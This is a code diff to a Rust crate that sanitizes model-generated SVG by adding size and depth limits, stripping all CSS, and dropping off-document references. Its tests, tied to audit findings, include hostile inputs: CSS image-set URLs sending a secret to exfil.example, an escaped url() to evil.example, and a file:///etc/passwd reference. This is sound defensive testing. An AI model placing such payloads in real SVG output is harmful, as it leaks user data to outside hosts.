@@ -8,6 +8,9 @@
 
 use async_trait::async_trait;
 use svg_hush::{Filter, data_url_filter};
+use xml::attribute::Attribute;
+use xml::reader::{ParserConfig, XmlEvent as REvent};
+use xml::writer::{EmitterConfig, XmlEvent as WEvent};
 
 /// A minimal, product-agnostic "turn a prompt into text" seam. Each
 /// product's own adapter (out of scope for this crate) implements this
@@ -61,25 +64,40 @@ fn extract_svg_markup(response: &str) -> Option<&str> {
     Some(&response[start..end])
 }
 
+/// Largest extracted `<svg>` block, in bytes, that [`generate_svg`] will
+/// sanitize. Larger input is rejected with
+/// [`SvgGenerationError::Sanitization`] rather than processed.
+pub const MAX_SVG_INPUT_BYTES: usize = 256 * 1024;
+
+/// Deepest element nesting [`generate_svg`] will sanitize. Deeper input is
+/// rejected with [`SvgGenerationError::Sanitization`]: `svg-hush`
+/// pretty-prints its output, so its size grows with the square of the
+/// nesting depth.
+pub const MAX_SVG_DEPTH: usize = 64;
+
 const SYSTEM_PROMPT: &str = "\
 You are generating a single, self-contained SVG image for the request \
 below. Respond with ONLY the SVG markup, starting with `<svg` and ending \
 with `</svg>`. The root `<svg>` element MUST include the attribute \
 `xmlns=\"http://www.w3.org/2000/svg\"`. Do not include any explanation, \
 and do not reference any external file, URL, font, or resource -- \
-everything must be inline within the SVG itself.\n\nRequest: ";
+everything must be inline within the SVG itself. Style elements with \
+presentation attributes such as `fill`, `stroke`, and `font-size`, not \
+CSS: `<style>` elements and `style` attributes are removed.\n\nRequest: ";
 
 /// Prompt `completer` for an SVG matching `user_prompt`, extract the SVG
-/// markup from its response, sanitize it (strip scripting and external
-/// references via `svg-hush`), and return the clean SVG source. This is
-/// the crate's one public entry point.
+/// markup from its response, sanitize it (strip scripting, all CSS, and
+/// every reference outside the document -- see `sanitize_svg`), and return
+/// the clean SVG source. This is the crate's one public entry point.
+///
+/// Input over [`MAX_SVG_INPUT_BYTES`] or nested deeper than
+/// [`MAX_SVG_DEPTH`] is rejected with [`SvgGenerationError::Sanitization`].
 ///
 /// The returned string is always a full XML document -- it begins with an
-/// `<?xml version="1.0" encoding="utf-8"?>` processing instruction and is
-/// pretty-printed with indentation, not a bare `<svg>...</svg>` fragment.
-/// `svg-hush` always emits this shape and it can't be configured off, so a
-/// caller splicing this directly into an existing HTML document should
-/// strip the leading declaration first.
+/// `<?xml version="1.0" encoding="utf-8"?>` processing instruction, not a
+/// bare `<svg>...</svg>` fragment, so a caller splicing this directly into
+/// an existing HTML document should strip the leading declaration first.
+/// It is not indented.
 pub async fn generate_svg(
     completer: &dyn TextCompleter,
     user_prompt: &str,
@@ -90,35 +108,203 @@ pub async fn generate_svg(
     sanitize_svg(extracted)
 }
 
-/// Run `svg` through `svg-hush`'s allowlist-based filter: strips
-/// `<script>` and `on*` event-handler attributes outright, and neutralizes
-/// cross-origin resource references -- SVG is executable-ish content (it
-/// can embed scripts in a browser-rendering context), so this is
-/// load-bearing, not optional polish. Cross-origin references are
-/// *rewritten* to same-origin absolute paths, not removed: e.g.
-/// `<image href="https://evil.example/track.png"/>` becomes
-/// `<image href="/track.png"/>` -- the reference survives, only the host
-/// is stripped, so no cross-origin fetch survives even though the
-/// reference itself is still present in the output. Also configures
-/// the data-URL filter to permit inline PNG/JPEG/GIF via
-/// `data_url_filter::allow_standard_images` -- `svg-hush`'s own default
-/// (`Filter::new()` with no filter set) drops ALL `data:` URLs
-/// unconditionally, so this is a deliberate relaxation, not a restriction:
-/// it exists because `SYSTEM_PROMPT` requires embedded resources to be
-/// inline, and this is how a compliant model does that. Other `data:`
-/// schemes (including nested `data:image/svg+xml`) are still dropped.
+/// Sanitize `svg` in three steps, each fail-closed:
 ///
-/// Note: the returned string is a full XML document (leading `<?xml ...?>`
-/// declaration, pretty-printed), not a bare `<svg>...</svg>` fragment --
+/// 1. [`check_input_limits`] rejects input over [`MAX_SVG_INPUT_BYTES`] or
+///    nested deeper than [`MAX_SVG_DEPTH`].
+/// 2. `svg-hush`'s allowlist-based filter strips `<script>`, `on*`
+///    event-handler attributes, `<foreignObject>` and other non-SVG
+///    elements, and every `data:` URL except inline PNG/JPEG/GIF
+///    (`data_url_filter::allow_standard_images` -- `svg-hush`'s own default
+///    drops ALL `data:` URLs, so this is a deliberate relaxation: it exists
+///    because `SYSTEM_PROMPT` requires embedded resources to be inline).
+/// 3. [`restrict_to_in_document_content`] post-filters `svg-hush`'s output,
+///    because `svg-hush` alone is not enough: it leaves CSS `image-set("…")`
+///    URLs untouched (a real cross-origin fetch in Chrome), and it
+///    *rewrites* off-document references to same-origin paths rather than
+///    removing them (`https://evil/x` becomes `/x`). This step removes all
+///    CSS and every reference that does not point inside the document.
+///
+/// SVG is executable-ish content, so this is load-bearing, not optional
+/// polish. The returned string is a full XML document (leading
+/// `<?xml ...?>` declaration), not a bare `<svg>...</svg>` fragment --
 /// see [`generate_svg`]'s doc comment.
 fn sanitize_svg(svg: &str) -> Result<String, SvgGenerationError> {
+    check_input_limits(svg)?;
     let mut filter = Filter::new();
     filter.set_data_url_filter(data_url_filter::allow_standard_images);
-    let mut out = Vec::new();
+    let mut hushed = Vec::new();
     filter
-        .filter(&mut svg.as_bytes(), &mut out)
+        .filter(&mut svg.as_bytes(), &mut hushed)
         .map_err(|e| SvgGenerationError::Sanitization(describe_error(&e)))?;
-    String::from_utf8(out).map_err(|e| SvgGenerationError::Sanitization(describe_error(&e)))
+    restrict_to_in_document_content(&hushed)
+}
+
+/// Reject input that would make `svg-hush`'s pretty-printed output blow
+/// up (its indentation makes output size quadratic in nesting depth).
+/// Malformed XML is not an error here: it is left for `svg-hush` to
+/// reject with its own, more specific message.
+fn check_input_limits(svg: &str) -> Result<(), SvgGenerationError> {
+    if svg.len() > MAX_SVG_INPUT_BYTES {
+        return Err(SvgGenerationError::Sanitization(format!(
+            "SVG is {} bytes, over the {MAX_SVG_INPUT_BYTES}-byte limit",
+            svg.len()
+        )));
+    }
+    let reader = ParserConfig::new()
+        .ignore_comments(true)
+        .max_entity_expansion_depth(3)
+        .create_reader(svg.as_bytes());
+    let mut depth = 0usize;
+    for event in reader {
+        match event {
+            Ok(REvent::StartElement { .. }) => {
+                depth += 1;
+                if depth > MAX_SVG_DEPTH {
+                    return Err(SvgGenerationError::Sanitization(format!(
+                        "SVG element nesting depth exceeds the limit of {MAX_SVG_DEPTH}"
+                    )));
+                }
+            }
+            Ok(REvent::EndElement { .. }) => depth = depth.saturating_sub(1),
+            Ok(REvent::EndDocument) | Err(_) => break,
+            Ok(_) => {}
+        }
+    }
+    Ok(())
+}
+
+/// Elements whose whitespace-only text nodes are content, not indentation.
+const TEXT_CONTENT_ELEMENTS: &[&str] = &["text", "tspan", "textPath", "title", "desc"];
+
+/// Re-emit `svg-hush`'s (already well-formed, prefix-free) output, keeping
+/// only content that cannot reach outside the document:
+///
+/// - `<style>` elements and `style` attributes are dropped entirely, with
+///   their content. CSS has fetch syntax `svg-hush` does not filter
+///   (`image-set()`, `-webkit-image-set()`, `cross-fade()`) and escape
+///   syntax that defeats its `url()` rewriting. Presentation attributes
+///   (`fill`, `stroke`, ...) cover what generated images need.
+/// - `href` (and the other URL-typed attributes) are kept only if they are
+///   a same-document fragment (`#id`) or a `data:` URL that `svg-hush`
+///   already allowed. Anything else -- which `svg-hush` would have
+///   rewritten to a same-origin path -- is dropped.
+/// - Any other attribute is dropped if it contains a `url(...)` whose
+///   target is not a fragment or `data:` URL, a CSS escape (`\`), or
+///   fetching CSS syntax.
+/// - Indentation is not re-added (whitespace is kept verbatim only inside
+///   text content), so output size tracks input size.
+fn restrict_to_in_document_content(hushed: &[u8]) -> Result<String, SvgGenerationError> {
+    let sanitization =
+        |e: &dyn std::error::Error| SvgGenerationError::Sanitization(describe_error(e));
+    let reader = ParserConfig::new()
+        .ignore_comments(true)
+        .create_reader(hushed);
+    let mut out = Vec::with_capacity(hushed.len());
+    let mut writer = EmitterConfig::new()
+        .perform_indent(false)
+        .pad_self_closing(false)
+        .create_writer(&mut out);
+
+    // Open elements, so whitespace can be kept inside text content only.
+    let mut open: Vec<String> = Vec::new();
+    let mut skipping = 0usize;
+    for event in reader {
+        let event = event.map_err(|e| sanitization(&e))?;
+        match event {
+            REvent::StartDocument { version, .. } => writer
+                .write(WEvent::StartDocument {
+                    version,
+                    encoding: Some("utf-8"),
+                    standalone: None,
+                })
+                .map_err(|e| sanitization(&e))?,
+            REvent::StartElement {
+                name,
+                attributes,
+                namespace,
+            } => {
+                if skipping > 0 || name.local_name == "style" {
+                    skipping += 1;
+                    continue;
+                }
+                let kept: Vec<Attribute<'_>> = attributes
+                    .iter()
+                    .filter(|a| attribute_is_in_document(&a.name.local_name, &a.value))
+                    .map(|a| a.borrow())
+                    .collect();
+                writer
+                    .write(WEvent::StartElement {
+                        name: name.borrow(),
+                        attributes: kept.into(),
+                        namespace: std::borrow::Cow::Borrowed(&namespace),
+                    })
+                    .map_err(|e| sanitization(&e))?;
+                open.push(name.local_name);
+            }
+            REvent::EndElement { .. } => {
+                if skipping > 0 {
+                    skipping -= 1;
+                    continue;
+                }
+                open.pop();
+                writer
+                    .write(WEvent::end_element())
+                    .map_err(|e| sanitization(&e))?;
+            }
+            REvent::Characters(text) if skipping == 0 => writer
+                .write(WEvent::Characters(&text))
+                .map_err(|e| sanitization(&e))?,
+            REvent::Whitespace(text)
+                if skipping == 0
+                    && open
+                        .iter()
+                        .any(|n| TEXT_CONTENT_ELEMENTS.contains(&n.as_str())) =>
+            {
+                writer
+                    .write(WEvent::Characters(&text))
+                    .map_err(|e| sanitization(&e))?
+            }
+            REvent::EndDocument => break,
+            _ => {}
+        }
+    }
+    String::from_utf8(out).map_err(|e| sanitization(&e))
+}
+
+/// Whether one attribute (already passed by `svg-hush`) is free of
+/// references outside the document. See [`restrict_to_in_document_content`].
+fn attribute_is_in_document(name: &str, value: &str) -> bool {
+    if name == "style" {
+        return false;
+    }
+    if matches!(name, "href" | "base" | "color-profile") {
+        return is_in_document_target(value);
+    }
+    let lower = value.to_ascii_lowercase();
+    if value.contains('\\')
+        || ["image-set(", "cross-fade(", "@import", "src("]
+            .iter()
+            .any(|f| lower.contains(f))
+    {
+        return false;
+    }
+    lower.match_indices("url(").all(|(i, _)| {
+        let target = &value[i + "url(".len()..];
+        let target = target.split(')').next().unwrap_or("");
+        is_in_document_target(target.trim().trim_matches(['"', '\'']).trim())
+    })
+}
+
+/// A same-document fragment (`#id`, including `svg-hush`'s neutralized
+/// `url(#)` placeholder) or a `data:` URL. `data:` URLs reaching this point
+/// already passed `svg-hush`'s image-only data-URL filter.
+fn is_in_document_target(target: &str) -> bool {
+    let target = target.trim();
+    target.starts_with('#')
+        || target
+            .get(..5)
+            .is_some_and(|scheme| scheme.eq_ignore_ascii_case("data:"))
 }
 
 /// Walk an error's `source()` chain and join every level's `Display`
@@ -317,23 +503,19 @@ mod tests {
         );
     }
 
-    /// Pins the actual behavior for cross-origin references: `svg-hush`
-    /// does not drop them, it rewrites them to a same-origin absolute
-    /// path (see the `sanitize_svg` doc comment). This asserts the
-    /// security-relevant part of that claim -- the external host itself
-    /// never survives into the returned string, so no cross-origin fetch
-    /// is possible -- without asserting the exact rewritten path, which
-    /// is `svg-hush`'s implementation detail, not this crate's contract.
+    /// Cross-origin references are removed, not rewritten: `svg-hush`
+    /// alone would turn this into `href="/track.png"`, a same-origin
+    /// request the model controls (see `restrict_to_in_document_content`).
     #[tokio::test]
-    async fn generate_svg_neutralizes_a_cross_origin_reference_without_dropping_it() {
+    async fn generate_svg_drops_a_cross_origin_reference() {
         let fake = FakeCompleter::returning(Ok("<svg xmlns=\"http://www.w3.org/2000/svg\">\
              <image href=\"https://some-external-host.example/track.png\"/>\
              <circle r=\"5\"/></svg>"
             .to_string()));
         let svg = generate_svg(&fake, "a circle").await.unwrap();
         assert!(
-            !svg.contains("some-external-host.example"),
-            "no cross-origin host may survive sanitization, got: {svg}"
+            !svg.contains("some-external-host.example") && !svg.contains("track.png"),
+            "no off-document reference may survive sanitization, got: {svg}"
         );
         assert!(
             svg.contains("circle"),
@@ -358,6 +540,136 @@ mod tests {
         assert!(
             svg.contains("data:image/png"),
             "an inline PNG data URL must survive sanitization, got: {svg}"
+        );
+    }
+
+    const NS: &str = "xmlns=\"http://www.w3.org/2000/svg\"";
+
+    async fn sanitize_via_generate(body: &str) -> Result<String, SvgGenerationError> {
+        let fake = FakeCompleter::returning(Ok(format!("<svg {NS}>{body}</svg>")));
+        generate_svg(&fake, "anything").await
+    }
+
+    /// Audit 2026-10-04 V1: svg-hush leaves CSS `image-set("...")` untouched
+    /// in a `<style>` element; Chrome fetched the URL from sanitized output.
+    #[tokio::test]
+    async fn generate_svg_drops_image_set_in_a_style_element() {
+        let svg = sanitize_via_generate(
+            "<style>svg{background-image:image-set(\"http://exfil.example/bg?secret=abc\" 1x)}\
+             </style><circle r=\"5\"/>",
+        )
+        .await
+        .unwrap();
+        assert!(
+            !svg.contains("exfil.example"),
+            "image-set URL survived: {svg}"
+        );
+        assert!(svg.contains("circle"));
+    }
+
+    #[tokio::test]
+    async fn generate_svg_drops_image_set_in_a_style_attribute() {
+        let svg = sanitize_via_generate(
+            "<rect style=\"mask-image:-webkit-image-set(&quot;http://exfil.example/m&quot; 1x)\" \
+             width=\"5\" height=\"5\"/>",
+        )
+        .await
+        .unwrap();
+        assert!(
+            !svg.contains("exfil.example"),
+            "image-set URL survived: {svg}"
+        );
+        assert!(svg.contains("rect"));
+    }
+
+    /// Audit V4: an escaped `url()` in CSS was mangled but kept the host text.
+    #[tokio::test]
+    async fn generate_svg_drops_escaped_css_url_host() {
+        let svg = sanitize_via_generate(
+            "<style>rect{fill:u\\72l(https://evil.example/x)}</style><rect width=\"5\"/>",
+        )
+        .await
+        .unwrap();
+        assert!(!svg.contains("evil.example"), "host survived: {svg}");
+    }
+
+    /// Audit V3: off-document references were rewritten to same-origin paths
+    /// (`https://evil/x` -> `/x`, `file:///etc/passwd` -> `/etc/passwd`); they
+    /// must be dropped instead.
+    #[tokio::test]
+    async fn generate_svg_drops_off_document_references_instead_of_rewriting() {
+        let svg = sanitize_via_generate(
+            "<image href=\"https://evil.example/track.png\"/>\
+             <image href=\"file:///etc/passwd\"/>\
+             <use href=\"../../secret.svg#a\"/>\
+             <rect fill=\"url(https://evil.example/paint.svg#p)\" width=\"5\"/>\
+             <circle r=\"5\"/>",
+        )
+        .await
+        .unwrap();
+        for leaked in ["track.png", "passwd", "secret.svg", "paint.svg"] {
+            assert!(!svg.contains(leaked), "{leaked} reference survived: {svg}");
+        }
+        assert!(svg.contains("circle"));
+    }
+
+    #[tokio::test]
+    async fn generate_svg_keeps_in_document_references() {
+        let svg = sanitize_via_generate(
+            "<defs><linearGradient id=\"g\"><stop offset=\"0\"/></linearGradient>\
+             <circle id=\"c\" r=\"5\"/></defs>\
+             <rect fill=\"url(#g)\" width=\"5\"/><use href=\"#c\"/>",
+        )
+        .await
+        .unwrap();
+        assert!(svg.contains("url(#g)"), "fragment url() was dropped: {svg}");
+        assert!(
+            svg.contains("href=\"#c\""),
+            "fragment href was dropped: {svg}"
+        );
+    }
+
+    fn nested_groups(depth: usize) -> String {
+        format!(
+            "{}<circle r=\"5\"/>{}",
+            "<g>".repeat(depth),
+            "</g>".repeat(depth)
+        )
+    }
+
+    /// Audit V2: svg-hush's pretty-printing grows quadratically with nesting
+    /// (depth 4000 -> 32 MB). Deep input must be rejected.
+    #[tokio::test]
+    async fn generate_svg_rejects_excessive_nesting() {
+        let err = sanitize_via_generate(&nested_groups(1000))
+            .await
+            .unwrap_err();
+        assert!(
+            matches!(&err, SvgGenerationError::Sanitization(m) if m.contains("depth")),
+            "got: {err:?}"
+        );
+    }
+
+    #[tokio::test]
+    async fn generate_svg_rejects_oversized_input() {
+        let body = "<rect width=\"5\" height=\"5\"/>".repeat(MAX_SVG_INPUT_BYTES / 20);
+        let err = sanitize_via_generate(&body).await.unwrap_err();
+        assert!(
+            matches!(&err, SvgGenerationError::Sanitization(m) if m.contains("bytes")),
+            "got: {err:?}"
+        );
+    }
+
+    #[tokio::test]
+    async fn generate_svg_output_is_not_amplified_by_nesting() {
+        let body = nested_groups(MAX_SVG_DEPTH - 2);
+        let input_len = body.len() + 60;
+        let svg = sanitize_via_generate(&body).await.unwrap();
+        assert!(
+            svg.len() <= input_len * 2,
+            "output {} bytes for {} bytes of input",
+            svg.len(),
+            input_len
         );
     }
 
